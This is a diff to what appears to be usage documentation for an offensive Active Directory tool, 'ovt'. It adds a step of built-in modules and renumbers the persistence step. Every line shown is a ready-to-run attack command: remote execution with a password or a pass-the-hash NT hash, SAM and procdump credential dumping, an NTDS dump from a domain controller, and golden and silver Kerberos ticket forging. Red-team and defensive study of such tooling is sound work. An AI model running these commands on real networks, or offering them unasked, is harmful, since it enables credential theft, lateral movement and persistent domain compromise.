@@ -814,7 +814,14 @@ ovt exec --target 10.10.10.50 --command "whoami /all" -d corp.local -u admin -p 
 ovt exec --target 10.10.10.50 --command "whoami /all" -d corp.local -u admin --nt-hash aad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
 ovt exec --target 10.10.10.50 --command "whoami /all" --method smbexec
 
-# Step 6: Persist
+# Step 6: Built-in modules (CME/netexec-style)
+ovt module list                                           # list all available modules
+ovt module list --category dump                           # filter by category
+ovt module info sam-dump                                  # show module details + params
+ovt module run procdump -t 10.10.10.50                    # run against a target
+ovt module run-parallel sam-dump -t 10.10.10.50,10.10.10.51 --concurrency 5  # parallel
+
+# Step 7: Persist
 ovt dump --target 10.10.10.1 ntds -d corp.local -u dadmin -p 'G0tcha!'
 ovt forge golden --domain-sid S-1-5-21-... --krbtgt-hash <32hex> --output golden.kirbi
 ovt forge silver --domain-sid S-1-5-21-... --service-hash <32hex> --spn cifs/dc01.corp.local --output silver.kirbi
